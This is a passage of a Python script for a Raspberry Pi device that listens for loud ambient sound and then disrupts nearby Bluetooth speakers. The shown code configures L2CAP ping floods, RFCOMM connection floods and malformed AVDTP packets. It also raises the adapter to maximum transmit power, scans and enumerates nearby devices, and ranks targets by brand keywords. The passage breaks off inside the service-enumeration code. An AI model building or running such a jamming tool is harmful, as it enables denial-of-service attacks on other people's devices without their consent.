#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Volume Be Gone - Bluetooth Speaker Control by Volume Level
Control automatico de parlantes Bluetooth basado en nivel de volumen ambiental.
Utiliza un encoder rotativo para configurar el umbral de activacion.

Author: Francisco Ortiz Rojas
        Ingeniero Electronico
        francisco.ortiz@marfinex.com

License: MIT
Version: 2.1
Date: Diciembre 2025

Basado en Reggaeton Be Gone de Roni Bandini
"""

import os
import subprocess
import sys

# Forzar UTF-8 en stdout/stderr para caracteres especiales
if sys.stdout.encoding != 'utf-8':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
import signal
import time
import datetime
import numpy as np
import sounddevice as sd
from RPi import GPIO
from luma.core.interface.serial import i2c
from luma.oled.device import ssd1306
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont
import threading
import bluetooth
import math
import json
from pathlib import Path
import re

# Configuración
# Detectar ruta del script automáticamente
script_dir = Path(__file__).parent.parent.resolve()
myPath = str(script_dir) + "/"
config_path = myPath + "config.json"
log_path = myPath + "log.txt"

threshold_db = 70  # Umbral inicial en decibeles
min_threshold_db = 70  # Umbral mínimo
max_threshold_db = 120  # Umbral máximo

# ===== CONFIGURACIÓN DE ATAQUE OPTIMIZADA =====
# L2CAP Ping parameters
l2ping_threads_per_device = 15  # Threads paralelos (reducido de 40 para evitar saturación)
l2ping_package_sizes = [600, 800, 1200]  # Probar múltiples tamaños de MTU
l2ping_timeout = 2  # Timeout para cada ping

# RFCOMM attack parameters
rfcomm_max_channels = 30  # Canales RFCOMM a probar (1-30)
rfcomm_connections_per_channel = 5  # Conexiones simultáneas por canal

# A2DP/AVDTP attack parameters
a2dp_stream_attacks = True  # Habilitar ataques específicos A2DP
avdtp_malformed_packets = True  # Enviar packets AVDTP malformados

# SDP enumeration
sdp_enumerate_before_attack = True  # Enumerar servicios SDP primero
sdp_timeout = 2  # Timeout reducido de 10s a 2s para no esperar tanto

# Attack filtering (CRÍTICO para concentrar el ataque)
max_simultaneous_attacks = 5  # Máximo dispositivos atacados simultáneamente
attack_only_audio_devices = True  # Solo atacar dispositivos de audio identificados
exclude_ble_from_classic_attacks = True  # No atacar BLE con L2CAP/RFCOMM

# ===== DICCIONARIO DE DISPOSITIVOS DE AUDIO =====
# Palabras clave que identifican parlantes/speakers en nombres de dispositivos
AUDIO_DEVICE_KEYWORDS = [
    # Palabras generales de audio
    'speaker', 'parlante', 'altavoz', 'soundbar', 'sound bar', 'audio',
    'boom', 'blast', 'play', 'music', 'wireless speaker', 'bluetooth speaker',

    # Marcas premium de audio
    'jbl', 'bose', 'sony', 'samsung', 'lg', 'philips', 'marshall',
    'harman', 'kardon', 'harman/kardon', 'beats', 'dr. beats', 'dre',
    'klipsch', 'yamaha', 'pioneer', 'denon', 'onkyo', 'marantz',

    # Marcas populares
    'anker', 'soundcore', 'ultimate ears', 'ue', 'tribit', 'doss',
    'oontz', 'wonderboom', 'megaboom', 'hyperboom', 'soundlink',
    'flip', 'charge', 'xtreme', 'pulse', 'go', 'clip', 'mini',

    # Marcas chinas comunes
    'xiaomi', 'mi speaker', 'redmi', 'huawei', 'honor', 'oppo',
    'realme', 'oneplus', 'vivo', 'tecno', 'infinix', 'itel',
    'tronsmart', 'bluedio', 'zealot', 'w-king', 'mifa', 'ggmm',
    'edifier', 'creative', 'musky', 'sanag', 'hopestar', 'toproad',

    # Nombres genéricos de parlantes chinos
    'bt speaker', 'bt-speaker', 'wireless', 'portable speaker',
    'mini speaker', 'outdoor speaker', 'waterproof speaker',
    'astronaut', 'robot', 'alien', 'spaceman',  # Astronaut Speaker!

    # Soundbars y home theater
    'soundbar', 'sound bar', 'home theater', 'tv speaker', 'subwoofer',
    'surround', '5.1', '7.1', 'dolby', 'atmos',

    # Smart speakers
    'alexa', 'echo', 'google home', 'nest audio', 'homepod', 'siri',

    # Modelos específicos conocidos
    'flip3', 'flip4', 'flip5', 'flip6', 'charge3', 'charge4', 'charge5',
    'xtreme2', 'xtreme3', 'pulse4', 'pulse5', 'boombox', 'partybox',
    'soundlink mini', 'soundlink color', 'soundlink revolve',
    'srs-xb', 'extra bass', 'megaboom 3', 'wonderboom 2',
]

# Clases de dispositivos Bluetooth que son de audio
# 0x240400 = Audio/Video (Loudspeaker)
# 0x240408 = Audio/Video (Portable Audio)
# 0x240414 = Audio/Video (HiFi Audio Device)
# 0x240418 = Audio/Video (Headphones)
# 0x20041C = Audio/Video (Microphone)
AUDIO_DEVICE_CLASSES = [
    0x240400,  # Loudspeaker
    0x240404,  # Wearable Headset Device
    0x240408,  # Hands-free Device
    0x24040C,  # Microphone
    0x240410,  # Loudspeaker
    0x240414,  # Headphones
    0x240418,  # Portable Audio
    0x24041C,  # Car Audio
    0x240420,  # Set-top box
    0x240424,  # HiFi Audio Device
    0x240428,  # VCR
    0x24042C,  # Video Camera
]

# General parameters
threadsCount = 1000
myDelay = 0.1
sample_rate = 44100
chunk_size = 4096
calibration_offset = 94  # Offset de calibración del micrófono

# Configuración de adaptador Bluetooth
# hci0 = Bluetooth interno de RPi
# hci1 = Adaptador USB externo (Clase 1)
bt_interface = "hci1"  # Cambiar a "hci0" para usar el interno
use_external_adapter = True  # True para usar adaptador USB

# Lista de dispositivos BT encontrados (caché acumulativa)
bt_devices = []
bt_devices_cache = {}  # Caché persistente por MAC address
bt_devices_ble = {}  # Caché de dispositivos BLE detectados
attack_threads = []
scanning = False
ble_scanning = False  # Flag para BLE scan en background
monitoring = False
config_mode = True  # Modo configuración al inicio
hcidump_process = None  # Proceso de captura hcidump

# Encoder rotativo KY-040
GPIO.setwarnings(False)
GPIO.setmode(GPIO.BCM)
encoder_clk = 19  # CLK del encoder (Pin 35)
encoder_dt = 13   # DT del encoder (Pin 33)
encoder_sw = 26   # Switch/botón del encoder (Pin 37)

# Variables del encoder
encoder_last_clk = GPIO.HIGH
encoder_counter = 0
last_encoder_time = 0
fast_rotation_threshold = 0.05  # 50ms para detectar giro rápido

# Oled screen (luma.oled - compatible con Debian Trixie)
# Configuracion I2C para SSD1306 128x64
I2C_PORT = 1        # Bus I2C (1 para RPi 2/3/4)
I2C_ADDRESS = 0x3C  # Direccion I2C del display (puede ser 0x3D en algunos)

# Inicializar pantalla con luma.oled
try:
    serial = i2c(port=I2C_PORT, address=I2C_ADDRESS)
    disp = ssd1306(serial, width=128, height=64)
except Exception as e:
    print(f"[!] Error inicializando display: {e}")
    print("[!] Verifica que I2C este habilitado y el display conectado")
    sys.exit(1)

# Cargar fuente con fallback
font_path = myPath + 'whitrabt.ttf'
try:
    if os.path.exists(font_path):
        font = ImageFont.truetype(font_path, 12)
        font_small = ImageFont.truetype(font_path, 10)
    else:
        print(f"[!] Advertencia: Fuente {font_path} no encontrada, usando default")
        font = ImageFont.load_default()
        font_small = ImageFont.load_default()
except Exception as e:
    print(f"[!] Error cargando fuente: {e}, usando default")
    font = ImageFont.load_default()
    font_small = ImageFont.load_default()

# Dimensiones del display (luma.oled usa .size)
width = disp.width
height = disp.height
padding = -2
top = padding
bottom = height-padding
x = 0

# Variable global para controlar el thread del encoder
encoder_running = False

# Variables para actualización asíncrona del display
display_db_level = 0.0
display_update_needed = False
display_lock = threading.Lock()

# ===== FUNCIONES DE FILTRADO DE DISPOSITIVOS =====

def is_audio_device(device):
    """
    Determina si un dispositivo es de audio basado en:
    1. Nombre del dispositivo (keywords)
    2. Clase del dispositivo Bluetooth
    3. Servicios SDP (si están disponibles)

    Args:
        device: Diccionario con información del dispositivo
               {'addr': 'XX:XX:XX:XX:XX:XX', 'name': 'Device Name', 'class': 0x240400, 'is_ble': False}

    Returns:
        bool: True si el dispositivo es identificado como dispositivo de audio
    """
    # Verificar nombre del dispositivo (manejar None)
    device_name = (device.get('name') or '').lower()

    # Si el nombre contiene alguna keyword de audio
    if device_name:  # Solo buscar si hay nombre
        for keyword in AUDIO_DEVICE_KEYWORDS:
            if keyword.lower() in device_name:
                return True

    # Verificar clase del dispositivo (solo Classic Bluetooth)
    device_class = device.get('class', None)
    if device_class is not None:
        if device_class in AUDIO_DEVICE_CLASSES:
            return True

        # Verificar major device class (bits 8-12)
        # 0x04 = Audio/Video (cualquier subcategoría)
        major_class = (device_class >> 8) & 0x1F
        if major_class == 0x04:  # Audio/Video
            return True

    # Verificar servicios SDP si están disponibles
    services = device.get('services', [])
    audio_service_uuids = [
        '0000110b',  # Audio Sink
        '0000110a',  # Audio Source
        '0000110d',  # Advanced Audio Distribution (A2DP)
        '0000110e',  # A/V Remote Control
        '00001108',  # Headset
        '0000111e',  # Hands-free
    ]

    for service in services:
        service_lower = service.lower()
        for audio_uuid in audio_service_uuids:
            if audio_uuid in service_lower:
                return True

    return False

def filter_attack_targets(all_devices):
    """
    Filtra y prioriza dispositivos para atacar basado en:
    1. Si attack_only_audio_devices=True, solo retorna dispositivos de audio
    2. Excluye dispositivos BLE de ataques Classic si exclude_ble_from_classic_attacks=True
    3. Limita a max_simultaneous_attacks dispositivos

    Args:
        all_devices: Lista de diccionarios con dispositivos detectados

    Returns:
        list: Lista filtrada de dispositivos a atacar (máximo max_simultaneous_attacks)
    """
    filtered = []

    for device in all_devices:
        # Si solo queremos audio, filtrar
        if attack_only_audio_devices:
            if not is_audio_device(device):
                continue

        # Si excluimos BLE de ataques Classic
        if exclude_ble_from_classic_attacks:
            if device.get('is_ble', False):
                # Los dispositivos BLE no deberían atacarse con L2CAP/RFCOMM
                continue

        filtered.append(device)

    # Priorizar por:
    # 1. Dispositivos con nombre conocido (no desconocidos)
    # 2. Dispositivos Classic sobre BLE
    # 3. Dispositivos con clase de audio definida

    def priority_score(dev):
        score = 0

        # Prioridad 1: Tiene nombre conocido
        if dev.get('name', 'Unknown') != 'Unknown':
            score += 100

        # Prioridad 2: Es Classic (no BLE)
        if not dev.get('is_ble', False):
            score += 50

        # Prioridad 3: Tiene clase de audio
        if dev.get('class', None) in AUDIO_DEVICE_CLASSES:
            score += 25

        # Prioridad 4: Nombre contiene keyword de marca premium
        premium_brands = ['jbl', 'bose', 'sony', 'samsung', 'lg', 'marshall', 'astronaut']
        dev_name_lower = dev.get('name', '').lower()
        for brand in premium_brands:
            if brand in dev_name_lower:
                score += 10
                break

        return score

    # Ordenar por prioridad (mayor score primero)
    filtered.sort(key=priority_score, reverse=True)

    # Limitar a max_simultaneous_attacks
    return filtered[:max_simultaneous_attacks]

def log_device_filtering(all_devices, filtered_devices):
    """
    Registra información sobre el filtrado de dispositivos
    """
    log_message = f"\n[*] ===== FILTRADO DE DISPOSITIVOS =====\n"
    log_message += f"[*] Total detectados: {len(all_devices)}\n"

    # Contar por tipo
    classic_count = sum(1 for d in all_devices if not d.get('is_ble', False))
    ble_count = sum(1 for d in all_devices if d.get('is_ble', False))
    audio_count = sum(1 for d in all_devices if is_audio_device(d))

    log_message += f"[*] Classic: {classic_count}, BLE: {ble_count}\n"
    log_message += f"[*] Dispositivos de audio: {audio_count}\n"
    log_message += f"[*] Seleccionados para ataque: {len(filtered_devices)}\n"

    if len(filtered_devices) > 0:
        log_message += f"[*] Objetivos:\n"
        for dev in filtered_devices:
            dev_type = "BLE" if dev.get('is_ble', False) else "Classic"
            log_message += f"    - {dev['addr']} ({dev.get('name', 'Unknown')}) [{dev_type}]\n"

    log_message += f"[*] =====================================\n"

    print(log_message)

    with open(log_path, "a", encoding='utf-8', errors='replace') as log_file:
        log_file.write(log_message)

def setup_encoder():
    """Configura el encoder rotativo usando polling (más confiable que interrupciones)"""
    global encoder_running

    # Configurar GPIO
    GPIO.setwarnings(False)
    GPIO.setmode(GPIO.BCM)

    GPIO.setup(encoder_clk, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(encoder_dt, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(encoder_sw, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    # Iniciar thread de polling para el encoder
    encoder_running = True
    encoder_thread = threading.Thread(target=encoder_polling_thread, daemon=True)
    encoder_thread.start()
    print("[*] Encoder configurado (modo polling)")

def encoder_polling_thread():
    """Thread que lee el encoder por polling (evita problemas con add_event_detect)"""
    global threshold_db, encoder_last_clk, last_encoder_time, config_mode, monitoring, encoder_running

    last_clk = GPIO.input(encoder_clk)
    last_sw = GPIO.HIGH
    button_press_time = 0

    while encoder_running:
        try:
            # Leer estado actual
            clk_state = GPIO.input(encoder_clk)
            dt_state = GPIO.input(encoder_dt)
            sw_state = GPIO.input(encoder_sw)

            # Detectar rotación del encoder
            if clk_state != last_clk:
                if clk_state == GPIO.LOW:
                    current_time = time.time()
                    time_diff = current_time - last_encoder_time

                    if config_mode:
                        # Determinar velocidad de rotación
                        if time_diff < fast_rotation_threshold:
                            step = 5  # Giro rápido
                        else:
                            step = 1  # Giro lento

                        if dt_state != clk_state:
                            # Giro horario - aumentar
                            if threshold_db < max_threshold_db:
                                threshold_db = min(threshold_db + step, max_threshold_db)
                                update_config_screen()
                        else:
                            # Giro antihorario - disminuir
                            if threshold_db > min_threshold_db:
                                threshold_db = max(threshold_db - step, min_threshold_db)
                                update_config_screen()

                        last_encoder_time = current_time

                last_clk = clk_state

            # Detectar botón del encoder
            if sw_state != last_sw:
                if sw_state == GPIO.LOW:
                    # Botón presionado
                    button_press_time = time.time()
                else:
                    # Botón liberado
                    if button_press_time > 0:
                        press_duration = time.time() - button_press_time
                        if press_duration < 2:
                            # Presión corta
                            if config_mode:
                                # En config: confirmar y comenzar monitoreo
                                config_mode = False
                                save_config()
                                print(f"[*] Configuracion confirmada: {threshold_db} dB")
                            elif monitoring:
                                # En monitoreo: volver a modo configuracion
                                config_mode = True
                                print(f"[*] Volviendo a modo configuracion")
                                update_config_screen()
                        # Presión larga se maneja abajo
                        button_press_time = 0

                last_sw = sw_state

            # Verificar presión larga del botón (reset)
            if sw_state == GPIO.LOW and button_press_time > 0:
                if time.time() - button_press_time > 2:
                    # Reset disponible en cualquier momento (monitoreo o config)
                    print("[*] Reiniciando sistema...")
                    monitoring = False
                    encoder_running = False
                    os.system("pkill -f l2ping")
                    os.system("pkill -f rfcomm")
                    GPIO.cleanup()
                    time.sleep(0.3)

                    # Detectar si corremos como servicio systemd
                    is_systemd_service = os.environ.get('INVOCATION_ID') is not None

                    if is_systemd_service:
                        # Reiniciar via systemctl
                        print("[*] Reiniciando servicio systemd...")
                        os.system("sudo systemctl restart volumebegone &")
                    else:
                        # Reiniciar manualmente
                        script_path = os.path.abspath(sys.argv[0])
                        subprocess.Popen(
                            ["sudo", sys.executable, script_path],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL,
                            start_new_session=True,
                            close_fds=True
                        )

                    time.sleep(0.3)
                    os._exit(0)

            # Pequeña pausa para no saturar CPU (2ms = respuesta rápida)
            time.sleep(0.002)

        except Exception as e:
            print(f"[!] Error en encoder polling: {e}")
            time.sleep(0.1)

def update_config_screen():
    """Actualiza la pantalla en modo configuracion con barra visual"""
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)

    # Titulo
    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)
    draw.text((x, top+14), "Config. Umbral:", font=font, fill=255)

    # Valor actual grande
    draw.text((x+30, top+28), f"{threshold_db} dB", font=font, fill=255)

    # Barra de progreso
    bar_y = top + 45
    bar_height = 8
    bar_width = 120
    bar_x = 4

    # Marco de la barra
    draw.rectangle((bar_x, bar_y, bar_x + bar_width, bar_y + bar_height), outline=255, fill=0)

    # Relleno de la barra (solo si hay progreso)
    fill_width = int((threshold_db - min_threshold_db) * bar_width / (max_threshold_db - min_threshold_db))
    if fill_width > 2:
        draw.rectangle((bar_x + 2, bar_y + 2, bar_x + fill_width, bar_y + bar_height - 2), outline=255, fill=255)

    # Instrucciones
    draw.text((x, top+56), "Gira:Ajustar OK:Iniciar", font=font_small, fill=255)

    disp.display(image)

def show_boot_screen(step, total_steps, message):
    """Muestra pantalla de carga con barra de progreso"""
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)

    # Logo/Titulo
    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)
    draw.text((x+90, top+2), "v2.1", font=font_small, fill=255)

    # Mensaje de estado con porcentaje
    percent = int((step / total_steps) * 100)
    draw.text((x, top+18), f"Cargando... {percent}%", font=font, fill=255)
    draw.text((x, top+32), message[:21], font=font_small, fill=255)

    # Barra de progreso
    bar_y = top + 46
    bar_height = 10
    bar_width = 120
    bar_x = 4

    # Marco
    draw.rectangle((bar_x, bar_y, bar_x + bar_width, bar_y + bar_height), outline=255, fill=0)

    # Progreso
    progress = int((step / total_steps) * bar_width)
    if progress > 2:
        draw.rectangle((bar_x + 1, bar_y + 1, bar_x + progress - 1, bar_y + bar_height - 1), outline=255, fill=255)

    disp.display(image)

def show_status_screen(status, details="", icon=""):
    """Muestra pantalla de estado simple"""
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)

    # Título
    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)

    # Icono (simple)
    if icon == "ok":
        # Checkmark simple
        draw.text((x+50, top+16), "[OK]", font=font, fill=255)
    elif icon == "error":
        draw.text((x+50, top+16), "[X]", font=font, fill=255)
    elif icon == "warning":
        draw.text((x+50, top+16), "[!]", font=font, fill=255)

    # Estado
    draw.text((x, top+28), status[:20], font=font, fill=255)
    if details:
        draw.text((x, top+40), details[:20], font=font_small, fill=255)

    disp.display(image)

def writeLog(myLine):
    """Escribe en el archivo de log"""
    try:
        now = datetime.datetime.now()
        dtFormatted = now.strftime("%Y-%m-%d %H:%M:%S")
        with open(log_path, 'a') as f:
            myLine = str(dtFormatted) + "," + myLine
            f.write(myLine + "\n")
    except Exception as e:
        print(f"[!] Error escribiendo log: {e}")

def updateScreen(message1, message2, message3="", message4=""):
    """Actualiza la pantalla OLED 128x64"""
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)
    padding = -2
    x = 0
    top = padding
    
    # Con 64 píxeles tienes más espacio
    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)
    draw.text((x, top+16), message1, font=font, fill=255)
    draw.text((x, top+28), message2, font=font, fill=255)
    if message3:
        draw.text((x, top+40), message3, font=font, fill=255)
    if message4:
        draw.text((x, top+52), message4, font=font_small, fill=255)
    
    disp.display(image)

def draw_volume_meter(db_level):
    """Dibuja un medidor visual del nivel de volumen"""
    try:
        image = Image.new('1', (width, height))
        draw = ImageDraw.Draw(image)
        draw.rectangle((0,0,width,height), outline=0, fill=0)

        # Titulo con estado
        status = "ACTIVO!" if db_level > threshold_db else ""
        draw.text((x, top+2), f"VBG {status}", font=font, fill=255)

        # Nivel actual y umbral
        draw.text((x, top+14), f"Nivel: {db_level:.1f} dB", font=font, fill=255)
        draw.text((x, top+26), f"Umbral: {threshold_db} dB", font=font, fill=255)

        # Medidor visual
        meter_y = top + 40
        meter_height = 10
        meter_width = 120
        meter_x = 4

        # Marco del medidor
        draw.rectangle((meter_x, meter_y, meter_x + meter_width, meter_y + meter_height), outline=255, fill=0)

        # Nivel actual (proteger contra valores negativos)
        if db_level > 0:
            level_width = int(min(db_level, 120) * meter_width / 120)
            if level_width > 2:
                draw.rectangle((meter_x + 2, meter_y + 2, meter_x + level_width, meter_y + meter_height - 2),
                              outline=255, fill=255)

        # Linea del umbral
        threshold_x = meter_x + int(threshold_db * meter_width / 120)
        draw.line((threshold_x, meter_y - 2, threshold_x, meter_y + meter_height + 2), fill=255, width=2)

        # Instrucciones: OK=Config, Hold=Reset
        draw.text((x, top+54), f"D:{len(bt_devices)} OK:Config 2s:Reset", font=font_small, fill=255)

        disp.display(image)
    except Exception as e:
        print(f"[!] Error actualizando display: {e}")

def request_display_update(db_level):
    """Solicita actualización del display de forma asíncrona (thread-safe)"""
    global display_db_level, display_update_needed
    with display_lock:
        display_db_level = db_level
        display_update_needed = True

def display_update_thread():
    """Thread dedicado para actualizar el display sin bloquear el audio"""
    global display_update_needed, display_db_level
    while monitoring:
        try:
            update_needed = False
            current_level = 0.0
            with display_lock:
                if display_update_needed:
                    update_needed = True
                    current_level = display_db_level
                    display_update_needed = False

            if update_needed and not config_mode:
                draw_volume_meter(current_level)

            time.sleep(0.05)  # ~20 FPS máximo para el display
        except Exception as e:
            print(f"[!] Error en display thread: {e}")
            time.sleep(0.1)

def check_bluetooth_adapters():
    """Verifica adaptadores Bluetooth disponibles y configura parámetros óptimos"""
    global bt_interface, use_external_adapter

    try:
        # Verificar qué adaptadores están disponibles
        result = subprocess.run(['hciconfig'], capture_output=True, text=True)
        adapters = []

        for line in result.stdout.split('\n'):
            if line.startswith('hci'):
                adapter = line.split(':')[0]
                adapters.append(adapter)

        print(f"[*] Adaptadores encontrados: {adapters}")
        writeLog(f"Adaptadores BT: {adapters}")

        # Si hay adaptador externo (hci1) y está configurado para usarlo
        if use_external_adapter and 'hci1' in adapters:
            bt_interface = "hci1"
            print("[*] Usando adaptador externo (hci1) - Clase 1")
        else:
            bt_interface = "hci0"
            print("[*] Usando adaptador interno (hci0)")

        # ===== CONFIGURACIÓN OPTIMIZADA DEL ADAPTADOR =====
        print(f"[*] Configurando {bt_interface} para máximo rendimiento...")

        # 1. Activar adaptador
        os.system(f"sudo hciconfig {bt_interface} up")

        # 2. Configurar clase de dispositivo
        os.system(f"sudo hciconfig {bt_interface} class 0x000100")

        # 3. Configurar como master
        os.system(f"sudo hciconfig {bt_interface} lm master")
        os.system(f"sudo hciconfig {bt_interface} lp active,master")

        # 4. Configurar TX Power Level (máximo para Clase 1)
        # Inquiry transmit power level = 4 (máximo)
        result = os.system(f"sudo hciconfig {bt_interface} inqtpl 4 2>/dev/null")
        if result == 0:
            print("[+] TX Power configurado al máximo (nivel 4)")
        else:
            print("[!] No se pudo configurar TX Power (puede no ser soportado)")

        # 5. Configurar modo piscan (page + inquiry scan)
        os.system(f"sudo hciconfig {bt_interface} piscan")

        # 6. Optimizar Scan Window/Interval con comandos HCI
        # HCI_LE_Set_Scan_Parameters: Interval=0x12 (11.25ms), Window=0x12 (11.25ms)
        # OGF=0x08 (LE Controller), OCF=0x000b (Set Scan Parameters)
        # 100% duty cycle para máxima detección
        print("[*] Optimizando scan window/interval...")
        os.system(f"sudo hcitool -i {bt_interface} cmd 0x08 0x000b 0x00 0x12 0x00 0x12 0x00 0x00 0x00 2>/dev/null")

        # 7. Para adaptadores CSR, intentar configurar potencia máxima con bccmd
        if use_external_adapter and bt_interface == "hci1":
            print("[*] Intentando configuración CSR avanzada...")
            # Nota: esto puede fallar si no es adaptador CSR, lo ignoramos
            os.system(f"sudo bccmd -d {bt_interface} psset -s 0x0000 0x0017 -16 2>/dev/null")
            os.system(f"sudo bccmd -d {bt_interface} psset -s 0x0000 0x002d -16 2>/dev/null")

        # 8. Habilitar BLE advertising (para dual-mode detection)
        os.system(f"sudo hciconfig {bt_interface} leadv 3 2>/dev/null")

        print("[+] Adaptador configurado exitosamente")
        writeLog(f"Adaptador {bt_interface} configurado: TX Power máximo, Scan optimizado")

        return True

    except Exception as e:
        print(f"[!] Error verificando adaptadores: {e}")
        return False

def save_config():
    """Guarda la configuración actual incluyendo dispositivos conocidos"""
    global bt_devices_cache
    config = {
        'threshold_db': threshold_db,
        'calibration_offset': calibration_offset,
        'use_external_adapter': use_external_adapter,
        'known_devices': bt_devices_cache  # Guardar caché de dispositivos
    }
    try:
        # Crear directorio si no existe (solo si hay directorio padre)
        config_dir = os.path.dirname(config_path)
        if config_dir:
            os.makedirs(config_dir, exist_ok=True)
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        writeLog(f"Configuración guardada: Umbral={threshold_db}dB, Dispositivos={len(bt_devices_cache)}")
    except Exception as e:
        print(f"[!] Error guardando configuración: {e}")

def load_config():
    """Carga la configuración guardada incluyendo dispositivos conocidos"""
    global threshold_db, calibration_offset, use_external_adapter, bt_devices_cache, bt_devices
    try:
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                config = json.load(f)
                threshold_db = config.get('threshold_db', 70)
                calibration_offset = config.get('calibration_offset', 94)
                use_external_adapter = config.get('use_external_adapter', True)
                # Cargar dispositivos conocidos
                bt_devices_cache = config.get('known_devices', {})
                if bt_devices_cache:
                    bt_devices = list(bt_devices_cache.values())
                    print(f"[*] Dispositivos conocidos cargados: {len(bt_devices_cache)}")
                print(f"[*] Configuración cargada: Umbral={threshold_db}dB, Adaptador={'Externo' if use_external_adapter else 'Interno'}")
        else:
            print("[*] Config.json no encontrado, usando configuración por defecto")
    except Exception as e:
        print(f"[!] Error cargando configuración: {e}, usando valores por defecto")

def calculate_db(audio_data):
    """Calcula el nivel de dB del audio"""
    # Eliminar valores cero para evitar log(0)
    audio_data = audio_data[audio_data != 0]
    if len(audio_data) == 0:
        return -np.inf
    
    # Calcular RMS (Root Mean Square)
    rms = np.sqrt(np.mean(audio_data**2))
    
    # Convertir a dB (20 * log10(rms))
    if rms > 0:
        db = 20 * np.log10(rms) + calibration_offset
    else:
        db = -np.inf
    
    return db

def scan_with_hcitool_inq(quick_mode=False):
    """Escanea usando hcitool inq (más agresivo, detecta dispositivos no-discoverable)"""
    global bt_interface
    devices_found = {}

    # En modo rápido, escaneo de 2 segundos; normal 8 segundos
    length = 2 if quick_mode else 8
    timeout = length + 3

    try:
        # hcitool inq devuelve: MAC  clock_offset  class
        result = subprocess.run(
            ['hcitool', '-i', bt_interface, 'inq', f'--length={length}', '--flush'],
            capture_output=True,
            text=True,
            timeout=timeout
        )

        for line in result.stdout.splitlines():
            line = line.strip()
            # Ignorar línea "Inquiring ..."
            if not line or line.startswith('Inquiring'):
                continue

            # Parsear: AA:BB:CC:DD:EE:FF    clock offset: 0x1234    class: 0x240404
            parts = line.split()
            if len(parts) >= 1:
                addr = parts[0]
                # Validar formato MAC
                if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', addr):
                    device_class = None
                    # Buscar clase en la línea
                    for i, part in enumerate(parts):
                        if part == 'class:' and i + 1 < len(parts):
                            try:
                                device_class = int(parts[i + 1], 16)
                            except ValueError:
                                pass

                    devices_found[addr] = {
                        'addr': addr,
                        'name': None,  # inq no da nombres
                        'class': device_class
                    }

        if devices_found:
            print(f"[*] hcitool inq encontró: {len(devices_found)} dispositivos")

    except subprocess.TimeoutExpired:
        print("[!] hcitool inq timeout")
    except FileNotFoundError:
        print("[!] hcitool no encontrado")
    except Exception as e:
        print(f"[!] Error en hcitool inq: {e}")

    return devices_found

def get_device_name(addr):
    """Obtiene el nombre de un dispositivo por su MAC"""
    global bt_interface
    try:
        result = subprocess.run(
            ['hcitool', '-i', bt_interface, 'name', addr],
            capture_output=True,
            text=True,
            timeout=5
        )
        name = result.stdout.strip()
        if name and name != addr:
            return name
    except:
        pass
    return None

def scan_ble_devices():
    """Escanea dispositivos BLE usando hcitool lescan --passive"""
    global bt_devices_ble, bt_devices_cache, ble_scanning, bt_interface

    if ble_scanning:
        return

    ble_scanning = True
    print("[*] Iniciando escaneo BLE pasivo...")

    try:
        # Ejecutar lescan en background y capturar output
        process = subprocess.Popen(
            ['hcitool', '-i', bt_interface, 'lescan', '--passive', '--duplicates'],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True
        )

        # Leer output por 5 segundos
        start_time = time.time()
        new_devices = 0

        while time.time() - start_time < 5:
            line = process.stdout.readline()
            if line:
                # Formato: "AA:BB:CC:DD:EE:FF (unknown)" o "AA:BB:CC:DD:EE:FF Device Name"
                parts = line.strip().split(None, 1)
                if len(parts) >= 1:
                    addr = parts[0]
                    name = parts[1] if len(parts) > 1 and parts[1] != '(unknown)' else None

                    # Validar formato MAC
                    if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', addr):
                        if addr not in bt_devices_cache and addr not in bt_devices_ble:
                            # Guardar dispositivo BLE SIN FILTRAR
                            bt_devices_ble[addr] = {
                                'addr': addr,
                                'name': name,
                                'class': None,
                                'is_ble': True,  # Marcar como BLE
                                'services': []
                            }
                            new_devices += 1
                            print(f"[+] BLE: {addr} - {name or 'Sin nombre'}")

        # Terminar proceso
        process.terminate()
        process.wait(timeout=2)

        if new_devices > 0:
            # Agregar dispositivos BLE al cache principal
            bt_devices_cache.update(bt_devices_ble)
            print(f"[*] BLE Scan: +{new_devices} nuevos dispositivos BLE")
            writeLog(f"BLE Scan: {new_devices} dispositivos encontrados")

    except subprocess.TimeoutExpired:
        if process:
            process.kill()
    except Exception as e:
        print(f"[!] Error en BLE scan: {e}")

    ble_scanning = False

def enumerate_sdp_services(device_addr):
    """Enumera servicios SDP de un dispositivo y retorna canales RFCOMM"""
    global bt_interface
    rfcomm_channels = []

    try:
        print(f"[*] Enumerando servicios SDP de {device_addr}...")
        result = subprocess.run(
            ['sdptool', 'browse', '--tree', device_addr],
            capture_output=True,
            text=True,
            timeout=10
        )

        # Parsear output para encontrar canales RFCOMM
        for line in result.stdout.splitlines():
            # Buscar líneas como "Channel: 1" o "RFCOMM Channel: 5"
            if 'channel' in line.lower():
                match = re.search(r'(\d+)', line)
                if match:
                    channel = int(match.group(1))
                    if 1 <= channel <= 30 and channel not in rfcomm_channels:
                        rfcomm_channels.append(channel)

        if rfcomm_channels:
            print(f"[+] SDP: Encontrados {len(rfcomm_channels)} canales RFCOMM: {rfcomm_channels}")
            writeLog(f"SDP {device_addr}: canales {rfcomm_channels}")
        else:
